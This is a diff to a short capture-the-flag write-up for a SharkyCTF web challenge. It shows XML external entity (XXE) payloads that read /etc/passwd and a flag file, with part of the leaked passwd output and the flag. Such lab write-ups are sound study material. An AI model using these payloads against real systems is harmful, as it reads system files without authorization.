@@ -1,11 +1,10 @@
-# ctf
-
 # SharkyCTF
 
-1. XXExternalXX
+1. XXExternalXX - Web
 
-![Index.html]
-Request
+[index.html](http://xxexternalxx.sharkyctf.xyz/)
+
+Request:
 ```
 GET / HTTP/1.1
 Host: xxexternalxx.sharkyctf.xyz
@@ -16,7 +15,7 @@ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Tride
 Connection: close
 ```
 
-Response
+Response:
 ```html
 <!DOCTYPE html>
 <html lang="fr" dir="ltr">
@@ -150,22 +149,18 @@ guest:x:405:100:guest:/dev/null:/sbin/nologin
 nobody:x:65534:65534:nobody:/:/sbin/nologin
 www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
 ```
+```test.xml```
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
 ```
 ![Image](https://github.com/n9uyen/ctf/blob/master/passwd.png?raw=true)
 
-And get flag
+And get flag:
+```flag.xml```
 ```xml
-<?xml version="1.0"?>
-<!DOCTYPE note [
-<!ENTITY file SYSTEM "file:///flag.txt" >
-]>
-<root>
-	<data>&file;</data>
-</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
 ```
 ![Image](https://github.com/n9uyen/ctf/blob/master/flag.png)
 
-Flag is ```shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}```
+Flag is: ```shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}```
 
